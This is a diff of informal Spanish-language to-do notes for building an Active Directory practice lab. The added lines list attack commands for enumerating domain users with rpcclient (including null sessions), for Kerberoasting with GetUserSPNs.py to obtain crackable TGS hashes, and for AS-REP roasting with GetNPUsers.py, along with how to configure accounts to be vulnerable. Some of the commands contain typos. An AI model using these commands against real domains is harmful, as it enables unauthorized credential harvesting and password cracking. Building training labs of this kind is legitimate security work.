@@ -1,11 +1,46 @@
+HACER EL SABADO!!!!!!!!!!!!!!
+
+AD03 -> Enumerar usuarios del AD con cualquier credencial valida de dominio:, puedo tener credenciales de un usuario sin poder conectarse de forma remota y de esta
+forma conseguir las credenciales de un usuario que se pueda conectar de forma remota.
+rpcclient -U "domain\user%pass" IP -c enumdomusers 
+or
+rpcclient -U "domain\user%pass" IP y se ponen luego los comandos 
++
+rpcclient -U "genwin.local\d.delbarrio%daniel" 192.168.56.252 -c "queryuser 0x44f" -> Para obtener descripcion? Mirar en video, min 56 el bucle 
+
+
+
+ADX  -> rpcclient -U "" IP -N -> enumdomusers -> Si esta en Null Session habilitado!!
+
+AD04 -> Kerberos:
+Usuario kerberoasteable:1:03:00
+Configurar:setspn -a genwin.local/user.DC-Company genwin.local\user
+Ahora con cualquier credencial:
+GetUserSPNs.pygenwin.local/user:pass
+GetUserSPNs.pygenwin.local/user:pass -request -> sale el hash TGS del usuario, este hash se puede romper con john 
+
+
+AD05 -> ASRPtoast:
+Si el AD tiene el Null session habilitado:1:06:58
+GetNpUser.py genwin.local/ -mo-pass -usersfile users.txt -> enumerar usuarios con rpcclient?
+Como configurar usuarios?? 
+En el DC, ir al usuario -> cuenta -> No pedir autenticacion kerberos previa
+El hash se puede romper.
+
+
+
+
+
+Tener en cuenta el timepo k tarda en crear el entorno y si tarda mas de 10' parar y decir error(controlar tiempo en funcion crear entorno)
+
+
+
+
 DAR UNA VULETA AL PROGRAMA??
 
 QUITAR SINCRONIZACION FECHA:
 https://www.howto-connect.com/disable-and-enable-internet-time-in-windows-10/
 
-
-2.- Comprobar interfaces del host only, habra k crearlo si no existe.!!!!!!!
-3.- Como saber desde winEnt la IP del winServer y viceversa para los ps1.
 
 
 1.- Mirar https://dmcxblue.gitbook.io/red-team-notes/execution
